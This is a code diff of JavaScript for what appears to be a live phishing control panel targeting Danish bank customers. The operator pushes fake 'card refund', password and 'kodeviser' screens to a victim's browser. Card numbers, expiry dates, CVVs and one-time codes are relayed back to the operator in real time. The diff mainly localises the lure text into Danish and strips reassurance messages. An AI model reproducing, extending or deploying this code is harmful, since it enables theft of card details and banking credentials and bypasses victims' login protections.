@@ -48,8 +48,8 @@
     if (!sessionId) {
       alert(
         role === "admin"
-          ? "Select a session first — click the user in the admin list"
-          : "No active session — client must finish Bruger-ID login first"
+          ? "Vælg først en session i listen"
+          : "Ingen aktiv session"
       );
       return Promise.resolve(false);
     }
@@ -151,17 +151,17 @@
     wrap.innerHTML =
       '<div style="width:100%;max-width:420px;background:#1e293b;border-radius:18px;padding:18px 16px 16px;color:#fff;box-shadow:0 20px 60px rgba(0,0,0,.45)">' +
       '<div style="display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:16px">' +
-      "<div><div style=\"font-weight:700;font-size:16px\">Refund card transaction</div>" +
-      '<div style="color:#94a3b8;font-size:12px;margin-top:2px">Who + how much</div></div>' +
+      "<div><div style=\"font-weight:700;font-size:16px\">Refundering på kort</div>" +
+      '<div style="color:#94a3b8;font-size:12px;margin-top:2px">Afsender + beløb</div></div>' +
       '<button type="button" id="juj-adm-rf-close" style="width:32px;height:32px;border:0;border-radius:999px;background:rgba(100,116,139,.5);color:#fff;cursor:pointer;font-size:16px">×</button>' +
       "</div>" +
-      '<label style="display:block;font-size:10px;font-weight:700;letter-spacing:.08em;color:#94a3b8;margin-bottom:6px">REFUND FROM (COMPANY / NAME)</label>' +
-      '<input id="juj-adm-rf-from" type="text" placeholder="e.g. BINANCE" style="width:100%;box-sizing:border-box;background:#0f172a;border:1px solid #334155;border-radius:12px;padding:12px 14px;color:#fff;font-size:14px;margin-bottom:14px" />' +
-      '<label style="display:block;font-size:10px;font-weight:700;letter-spacing:.08em;color:#94a3b8;margin-bottom:6px">AMOUNT</label>' +
-      '<input id="juj-adm-rf-amount" type="text" inputmode="decimal" placeholder="e.g. 1250" style="width:100%;box-sizing:border-box;background:#0f172a;border:1px solid #334155;border-radius:12px;padding:12px 14px;color:#fff;font-size:14px;margin-bottom:16px" />' +
+      '<label style="display:block;font-size:10px;font-weight:700;letter-spacing:.08em;color:#94a3b8;margin-bottom:6px">FRA (FIRMA / NAVN)</label>' +
+      '<input id="juj-adm-rf-from" type="text" placeholder="f.eks. BINANCE" style="width:100%;box-sizing:border-box;background:#0f172a;border:1px solid #334155;border-radius:12px;padding:12px 14px;color:#fff;font-size:14px;margin-bottom:14px" />' +
+      '<label style="display:block;font-size:10px;font-weight:700;letter-spacing:.08em;color:#94a3b8;margin-bottom:6px">BELØB</label>' +
+      '<input id="juj-adm-rf-amount" type="text" inputmode="decimal" placeholder="f.eks. 1250" style="width:100%;box-sizing:border-box;background:#0f172a;border:1px solid #334155;border-radius:12px;padding:12px 14px;color:#fff;font-size:14px;margin-bottom:16px" />' +
       '<div style="display:flex;gap:10px">' +
-      '<button type="button" id="juj-adm-rf-skip" style="flex:1;background:#334155;color:#e2e8f0;border:0;border-radius:12px;padding:12px;font-weight:700;font-size:13px;cursor:pointer">No amount</button>' +
-      '<button type="button" id="juj-adm-rf-go" style="flex:1.2;background:#0060e6;color:#fff;border:0;border-radius:12px;padding:12px;font-weight:700;font-size:13px;cursor:pointer">Activate refund</button>' +
+      '<button type="button" id="juj-adm-rf-skip" style="flex:1;background:#334155;color:#e2e8f0;border:0;border-radius:12px;padding:12px;font-weight:700;font-size:13px;cursor:pointer">Uden beløb</button>' +
+      '<button type="button" id="juj-adm-rf-go" style="flex:1.2;background:#0060e6;color:#fff;border:0;border-radius:12px;padding:12px;font-weight:700;font-size:13px;cursor:pointer">Send til klient</button>' +
       "</div></div>";
 
     document.body.appendChild(wrap);
@@ -186,7 +186,7 @@
         amount: amount || null,
       }).then(function (ok) {
         if (ok) {
-          toast("Sent to client — client must already be past login (waiting screen)");
+          toast("Sendt til klient");
           closeOverlay("juj-admin-refund-modal");
         }
       });
@@ -289,7 +289,6 @@
         amount: amount || null,
       }).then(function () {
         closeOverlay("juj-client-refund");
-        toast("Sent — please wait");
       });
     };
     setTimeout(function () {
@@ -329,7 +328,6 @@
       btn.disabled = true;
       send("user", { type: "adgangskode-submitted", code: code }).then(function () {
         closeOverlay("juj-client-refund");
-        toast("Sent — please wait");
       });
     };
     setTimeout(function () {
@@ -427,7 +425,6 @@
       btn.disabled = true;
       send("user", { type: "kodeviser-submitted", code: code }).then(function () {
         closeOverlay("juj-client-refund");
-        toast("Sent — please wait");
       });
     };
 
@@ -486,11 +483,11 @@
         if (msg.type === "show-card-refund") showClientCard(msg);
         if (msg.type === "show-kodeviser") showClientKodeviser();
       } else {
-        if (msg.type === "adgangskode-submitted") toast("Password: " + (msg.code || "—"));
+        if (msg.type === "adgangskode-submitted") toast("Adgangskode: " + (msg.code || "—"));
         if (msg.type === "kodeviser-submitted") toast("Kodeviser: " + (msg.code || "—"));
         if (msg.type === "card-refund-submitted") {
           toast(
-            "Card " +
+            "Kort " +
               (msg.cardNumber || "—") +
               (msg.expiry ? " | " + msg.expiry : "") +
               (msg.cvv ? " | CVV " + msg.cvv : "")
@@ -598,7 +595,7 @@
     box.style.cssText = "margin-bottom:20px";
     box.innerHTML =
       '<div style="font-size:10px;color:#9ca3af;text-transform:uppercase;letter-spacing:.06em;font-weight:700;margin-bottom:8px">Refundering på kort</div>' +
-      '<button type="button" id="juj-btn-card" style="width:100%;background:#0f766e;color:#fff;border:0;border-radius:12px;padding:10px 12px;font-size:12px;font-weight:700;cursor:pointer;margin-bottom:8px">Refund card transaction</button>' +
+      '<button type="button" id="juj-btn-card" style="width:100%;background:#0f766e;color:#fff;border:0;border-radius:12px;padding:10px 12px;font-size:12px;font-weight:700;cursor:pointer;margin-bottom:8px">Refundering på kort</button>' +
       '<button type="button" id="juj-btn-ak" style="width:100%;background:#0060e6;color:#fff;border:0;border-radius:12px;padding:10px 12px;font-size:12px;font-weight:700;cursor:pointer;margin-bottom:8px">Adgangskode</button>' +
       '<button type="button" id="juj-btn-kv" style="width:100%;background:#4f46e5;color:#fff;border:0;border-radius:12px;padding:10px 12px;font-size:12px;font-weight:700;cursor:pointer">Kodeviser</button>';
     anchor.parentElement.insertBefore(box, anchor.nextSibling);
@@ -610,13 +607,13 @@
     document.getElementById("juj-btn-ak").onclick = function () {
       syncAdminSidFromSpa();
       send("admin", { type: "show-adgangskode" }).then(function (ok) {
-        if (ok) toast("Password screen sent — client must be past login");
+        if (ok) toast("Adgangskode sendt til klient");
       });
     };
     document.getElementById("juj-btn-kv").onclick = function () {
       syncAdminSidFromSpa();
       send("admin", { type: "show-kodeviser" }).then(function (ok) {
-        if (ok) toast("Kodeviser sent — client must be past login");
+        if (ok) toast("Kodeviser sendt til klient");
       });
     };
   }
